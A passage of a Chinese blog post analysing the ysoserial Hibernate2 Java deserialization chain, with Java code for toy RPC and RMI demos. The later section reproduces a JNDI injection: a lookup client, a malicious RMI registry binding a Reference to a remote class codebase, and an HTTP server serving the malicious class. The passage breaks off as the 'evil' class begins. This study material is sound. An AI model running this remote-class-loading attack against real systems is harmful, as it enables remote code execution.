class="token function">writeObject</span><span class="token punctuation">(</span>parameterType<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    DataInputStream inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String result <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> result<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请确认你调用的方法是否存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> null<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        Object object <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>RpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>RpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> object<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>不难看出最终返回的结果是一个实现了RpcPrincipleTestInterface接口的动态生成的Proxy对象，传入的handler参数中包含了调用远程方法的核心操作。</p><p>首先熟悉java动态代理的同学都清楚，当我们调用动态代理对象的某个方法时，其实都是在调用InvocationHandler对象中被重写的invoke方法。所以当我们在RpcPrincipleClientTestimpl中调用rpcPrincipleTestInterface.myAdd()方法时本质调用的是InvocationHandler.invoke方法。同时方法名“myAdd”作为参数传入invoke中，我们首先创建一个socket对象将请求的地址和端口作为参数传入。然后获取方法名，接下来判断当前调用的方法是哪一个，判断完成后，将方法名，参数类型，还有参数的值序列化发送给server端，然后通过DataInputStream读取socket接收到的数据并反序列化，然后进行返回。</p><p>讲完了client端，我们再来看看server端，首先来看RpcPrincipleTestImpl.java的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcPrincipleTestImpl</span> <span class="token keyword">implements</span> <span class="token class-name">RpcPrincipleTestInterface</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 8084422270826068537L<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">myAdd</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNum<span class="token punctuation">,</span><span class="token keyword">int</span> SecondNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> firstNum <span class="token operator">+</span> SecondNum<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">mySub</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNum<span class="token punctuation">,</span><span class="token keyword">int</span> SecondNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> firstNum <span class="token operator">-</span> SecondNum<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token operator">+</span><span class="token string">"Say Hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们看到RpcPrincipleTestInterface接口真正的实现类是RpcPrincipleTestImpl，那刚才我们究竟是怎么做到在client端调用了server端的RpcPrincipleTestImpl的呢？关键在于RpcPrincipleServerSkeleton这个类，我们观察下他的源码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcPrincipleServerSkeleton</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> running <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ServerSocket serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>running<span class="token punctuation">)</span><span class="token punctuation">{</span>            Socket s <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">process</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span>Socket s<span class="token punctuation">)</span><span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        InputStream in <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        OutputStream out <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        String methodName <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> parameterType <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        RpcPrincipleTestInterface rpcPrincipleTestInterface <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RpcPrincipleTestImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method method <span class="token operator">=</span> rpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">,</span>parameterType<span class="token punctuation">)</span><span class="token punctuation">;</span>        Type t <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getAnnotatedReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"int"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>rpcPrincipleTestInterface<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>            DataOutputStream output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>            output<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            output<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            String result <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>rpcPrincipleTestInterface<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>            DataOutputStream output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>            output<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            output<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在RpcPrincipleServerSkeleton中我们首先监听了8888端口，然后将Socket对象传入process方法中。process方法中接收客户端传的，调用方法的方法名，参数类型，以及参数值。按顺序将其反序列化出来然后通过反射调用RpcPrincipleTestImpl对象中的对应方法，然后将得到的返回值进行类型的判断，紧接着就将其进行序列化然后通过socket返回給client端，至此就是一个RPC的基础流程，我在这里演示的RPC demo可以说是简陋，真实的RPC框架背后的实现要比这复杂n倍，但是复杂归复杂，原理都是一样的。</p><h2 id="3-RMI简介"><a href="#3-RMI简介" class="headerlink" title="3.RMI简介"></a>3.RMI简介</h2><p>介绍完了RPC，接下来就介绍一下RPC框架的一种实现，也就是RMI，直接通过代码来进行演示</p><p>先看一下远程方法调用方，也就是client端的目录结构</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/5.png" alt="5"></p><p>然后是远程方法服务提供方，也就是server端</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/6.png" alt="6"></p><p>RMITestInterface是一个公开接口，就像上一节所讲的，底层生成的代理类是需要实现该接口的,此公共接口一定要继承java.rmi.Remote接口，否则编译时会报错，以下是RMITestInterface的代码,</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RMITestInterface</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span><span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们在RMIClientTest类中发起远程方法调用的请求，以下是RMIClientTest的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClientTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">/** Registry registry = LocateRegistry.getRegistry("localhost",1099);            RMITestInterface rmiTestInterface = (RMITestInterface) registry.lookup("RMIClientTestImpl");*/</span>            RMITestInterface rmiTestInterface <span class="token operator">=</span> <span class="token punctuation">(</span>RMITestInterface<span class="token punctuation">)</span> Naming<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/RMITestInterfaceImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**Naming.lookup帮忙封装了上面的两个步骤，将两步合成一步了，原本要写两行代码现在只要一行就行了*/</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rmiTestInterface<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接下来就是server端的代码，首先我们看RMITestInterfaceImpl，可以看到该类实现了RMITestInterface接口，同时同学们应该也注意到该类继承了一个UnicastRemoteObject类，在RMI中如果一个类要绑定进行远程方法提供的话有两种方法，一就是继承UnicastRemoteObject类，第二种就是在实例化时通过调用UnicastRemoteObject.exportObject()静态方法来实例化该对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMITestInterfaceImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">RMITestInterface</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>6151588688230387192L<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token function">RMITestInterfaceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Hello"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"^_^"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后我们来看RMIServerTestImpl类，在该类里我们绑定了一个RMITestInterface对象来进行提供远程方法调用的服务</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServerTestImpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            RMITestInterface rmiTestInterface <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMITestInterfaceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Naming<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/RMITestInterfaceImpl"</span><span class="token punctuation">,</span>rmiTestInterface<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Ready"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后我们在client端执行RMIClientTest可得到以下结果</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/7.png" alt="7"></p><h2 id="4-Hibernate2漏洞原理深度分析"><a href="#4-Hibernate2漏洞原理深度分析" class="headerlink" title="4.Hibernate2漏洞原理深度分析"></a>4.Hibernate2漏洞原理深度分析</h2><p>整体漏洞的执行逻辑同Hibernate1并无太大差别，首先看一下ysoserial Hibernate封装恶意代码的逻辑，这次还是用了和上次一样的脑图，对其中利用到的不同的类进行了修改</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/17.png" alt="17"></p><p>除了一开始被封装而且是用来最终执行代码的TemplatesImpl类变成了JdbcRowSetImpl类以外几乎没有什么变化了，也就是说前期的执行调用链是一样的。</p><p>为了方便大家理解就再把执行过程从头简述一遍。</p><p>首先反序列化我们最终封装完成的HashMap对象，自然会调用HashMap的readObject()方法,然后在readObject()方法的末尾有一个for循环，</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/18.png" alt="18"></p><p>由脑图可知这里的key和value对象存储的是同一个Type对象</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/19.png" alt="19"></p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/20.png" alt="20"></p><p>接下来在putForCreate()方法里又调用的hash()方法</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/21.png" alt="21"></p><p>最终嵌套执行到BasicPropertyAccessor$BasicGetter的get()方法。<img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/22.png" alt="22"></p><p>这里调用了Method.invoke方法，我们看一下method变量和target的具体信息<img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/23.png" alt="23"></p><p>可以看到最终通过反射的方式调用了JdbcRowSetImpl.getDatabaseMetaData()方法,漏洞触发真正的重点从这里才开始和ysoserial Hibernate1有所不同。</p><p>我们跟进getDatabaseMetaData()方法，看到该方法同时调用了自身的connect方法，我们继续跟进</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/24.png" alt="24"></p><p>Var1.lookup(this.getDataSourceName())就是触发远程代码执行的罪魁祸首</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/25.png" alt="25"></p><p>但这么说大家肯定有人会不理解，为何这个函数会造成代码执行。</p><p>首先我们先看这个var1，var1是一个InitialContext对象，存在于javax.naming这个包中<img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/26.png" alt="26"></p><p>那么javax.naming这个包又是干什么的？我们百度一下就可以知道，这个包就是我们常听到的一个概念JNDI</p><p>关于JNDI的基础概念就不再过多赘述了</p><p>正如第3节内容所讲的RMI远程方法调用一样，JNDI功能中的一部分就是帮我们又封装了一下RMI，从而可以让我们更方便的实现远程方法调用。</p><p>下面用代码来复现这个漏洞的原理</p><p>首先是jndi client端</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JndiClientTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:9999/evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然后是一个恶意server端</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NamingException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"java RMI registry created. port on 9999..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExportObject"</span><span class="token punctuation">,</span> <span class="token string">"com.test.remoteclass.evil"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8000/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"evil"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>紧接着是一个用来提供恶意类加载的一个简易http Server</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HttpServer</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"new http request from "</span> <span class="token operator">+</span> httpExchange<span class="token punctuation">.</span><span class="token function">getRemoteAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> httpExchange<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InputStream inputStream <span class="token operator">=</span> HttpServer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>httpExchange<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>inputStream<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            httpExchange<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpServer httpServer <span class="token operator">=</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpServer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"String HTTP Server on port: 8000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        httpServer<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HttpServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        httpServer<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        httpServer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后就是我们包含有恶意代码的类了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token 